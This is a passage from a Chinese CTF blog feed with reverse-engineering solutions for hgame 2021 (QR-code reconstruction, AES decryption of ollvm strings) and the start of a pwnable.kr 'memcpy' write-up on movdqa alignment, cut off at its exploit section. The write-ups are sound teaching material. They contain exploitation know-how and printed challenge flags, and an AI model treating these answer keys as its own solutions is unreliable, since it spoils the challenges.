L_24 = V_2;</span><br><span class="line">double L_25 = V_0; // y下标</span><br><span class="line">double L_26 = V_2;</span><br><span class="line">double L_27 = V_1; // z下标</span><br><span class="line">return (bool)((((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_add((double)((double)il2cpp_codegen_multiply((double)((double)il2cpp_codegen_multiply((double)L_8, (double)L_23)), (double)L_24)), (double)((double)il2cpp_codegen_multiply((double)L_25, (double)L_26)))), (double)L_27))) &gt; ((double)(0.0)))? 1 : 0);</span><br></pre></td></tr></table></figure><p>上面的代码化简后就是下面的数学表达式，提取matrix进行图片绘制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v_2 = (j % 3) - 1;</span><br><span class="line">((x * (v_2 * v_2) + y * v_2 + z) &gt; 0) ? 1 : 0;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> matrix[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = &#123;...&#125;;  <span class="comment">// 数据太多省略</span></span><br><span class="line"><span class="keyword">int</span> map[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line"><span class="keyword">double</span> x, y, z;</span><br><span class="line"><span class="keyword">int</span> dot;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++) &#123;</span><br><span class="line"><span class="keyword">double</span> v_2 = (j % <span class="number">3</span>) - <span class="number">1</span>;</span><br><span class="line">x = matrix[i][j / <span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">y = matrix[i][j / <span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">z = matrix[i][j / <span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">dot = ((x * (v_2 * v_2) + y * v_2 + z) &gt; <span class="number">0</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">map[i][j] = dot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后大概是这样，可以看到是一个二维码。</p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210329193504145.png" style="zoom:67%;" /><p>再用python的PIL库将其打印成二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">45</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(MAX,MAX))</span><br><span class="line">dot = <span class="string">&quot;111111100011101111100101000001110100101111111100000100001011111010001110100011001001000001101110101110100100000100111010100101001011101101110101101010111001001001001111101101011101101110101110001100101111111011101111101011101100000101011000100101000100011111000001000001111111101010101010101010101010101010101111111000000001100001101111000111101010000100000000101111100001111010101111111000000000101111100000100010001011011110010110001010001010000001000101111000011001000111010110100010011001110010100001000010001111010011000100111000001100100110101111100101101101010101110010010101001010001011101001011011101100000101101110000110010000111101101001010000100101110010010101100101111011101101110000101111101101101000100110110100101000010101010000101010100001110011100000010001001001000100010111111101101100111000011110100010000010100111000011011001010010011000001010101101011111000000101010011011011001011111111100110100101111110001000110111110111111110001100000011111000100011110010100011101001010101001011101011010110010000101101011010101110001100001010011000110010100011100011100001111111101110011011111110001111110111110001111110011111001100101101000010101001001101001100100110100111010001011001011111111011110010010011001000011110111111111101001000100011111011001111110011100011010101010010100001111000011011011001000001000100011111010000111001000100100101001100110001101100010111110010000011011101010111101010100000100001101011010011001110011100010111111000101110101110110010100111001110010111010001101000100001110010100010110000010111111000000010010110100110101110111100011110011101001101111111011001100100011010110100110100011100010011111101000111000111111100000000001110101000011000111001101101100010100111111100101011000101010100000011000101011110100000101100000110101000111001010110100011111101110101111001110001111110000000101111110000101110101111010011010010010011010001111001111101110101110100010000101010010100100101101100100000100111010110100001100000101111111001100111111101000101001110100110101100000100100010&quot;</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">45</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">        <span class="keyword">if</span> dot[i*x+j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag: hgame&#123;YOU~hEn-duO_yOU-X|~DOU-sHi~un1Ty~k4i-fA_de_O&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h3><p>这个程序对里面所有的字符串进行了加密，需要慢慢寻找加密函数，在动态调试后发现了AES的S_box盒子，且发现加密模式为CBC模式，动调出key与iv后直接写脚本解密，初始iv为0-15</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="built_in">bytes</span>(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line">Cipher = <span class="built_in">bytes</span>([<span class="number">145</span>, <span class="number">179</span>, <span class="number">193</span>, <span class="number">235</span>, <span class="number">20</span>, <span class="number">93</span>, <span class="number">213</span>, <span class="number">206</span>, <span class="number">58</span>, <span class="number">29</span>, <span class="number">48</span>, <span class="number">228</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">107</span>, <span class="number">215</span>,</span><br><span class="line">        <span class="number">105</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">163</span>, <span class="number">165</span>, <span class="number">223</span>, <span class="number">27</span>, <span class="number">253</span>, <span class="number">28</span>, <span class="number">2</span>, <span class="number">137</span>, <span class="number">20</span>, <span class="number">32</span>, <span class="number">122</span>, <span class="number">253</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">82</span>, <span class="number">248</span>, <span class="number">169</span>, <span class="number">249</span>, <span class="number">241</span>, <span class="number">107</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">80</span>, <span class="number">91</span>, <span class="number">236</span>, <span class="number">66</span>, <span class="number">209</span>, <span class="number">140</span>,</span><br><span class="line">        <span class="number">184</span>, <span class="number">18</span>, <span class="number">207</span>, <span class="number">44</span>, <span class="number">169</span>, <span class="number">105</span>, <span class="number">49</span>, <span class="number">70</span>, <span class="number">253</span>, <span class="number">155</span>, <span class="number">234</span>, <span class="number">222</span>, <span class="number">200</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">105</span>])</span><br><span class="line">key = <span class="string">b&#x27;CryptoFAILUREforRSA2048Key!!!!!!&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">Plain = aes.decrypt(Cipher)</span><br><span class="line"><span class="built_in">print</span>(Plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;hgame 2021的逆向部分题解，一道nc题和一道安卓逆向没有做，每周的题目都看了看，做</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr memcpy</title>
    <link href="http://example.com/34917/"/>
    <id>http://example.com/34917/</id>
    <published>2021-07-14T04:44:16.850Z</published>
    <updated>2022-01-01T09:55:37.355Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Markdown/image-20210208131853431.png">    </p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line"><span class="keyword">int</span> e;</span><br><span class="line"><span class="keyword">char</span>* src;</span><br><span class="line"><span class="keyword">char</span>* dest;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="comment">// allocate memory</span></span><br><span class="line"><span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setup experiment parameters</span></span><br><span class="line"><span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;<span class="comment">// 2^13 = 8K</span></span><br><span class="line">low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between %d ~ %d : &quot;</span>, low, high);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">sizes[i++] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// run experiment</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">size = sizes[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;experiment %d : memcpy with buffer size %d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">slow_memcpy(dest, src, size);<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">fast_memcpy(dest, src, size);<span class="comment">// block-to-block memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><ul><li>在申请的内存小于64时，采用的是<code>slow_memcpy</code>逐个字节的复制，没有其他要求，但是速度较慢</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在复制内存大于64个字节时，采用<code>fast_memcpy</code>中的指令复制，复制速度快</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用使用指令<code>nc pwnable.kr 9022</code>连接，随便输入了一些值过后发现永远停留在了第四次检测，但是如果在本地输入却可以通过</p><ul><li><p><strong>movdqa</strong>指令</p><p><code>movdqa</code>指令的操作数都要求16字节对齐，在本地可以正常运行时因为malloc本身就是8字节对齐的，加上8个字节的chunk头，malloc返回的指针就已经遵循16字节对齐了，所以随便输入也可以正常运行，但是在靶机上可能是因为Ubuntu版本的问题，chunk在内存中是连续的，而不遵循内存对齐，所以需要我们自己计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算在范围中可输入的数字那些符合要求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">6</span>:</span><br><span class="line">        chunk_size[i-<span class="number">3</span>].append(<span class="built_in">pow</span>(<span class="number">2</span>,i))</span><br><span class="line">    <span class="keyword">if</span> i &gt;= <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">for</span> size <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">pow</span>(<span class="number">2</span>, i), <span class="built_in">pow</span>(<span class="number">2</span>, i+<span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> (size-<span class="number">8</span>)%<span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                chunk_size[i-<span class="number">3</span>].append(size)</span><br></pre></td></tr></table></figure></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 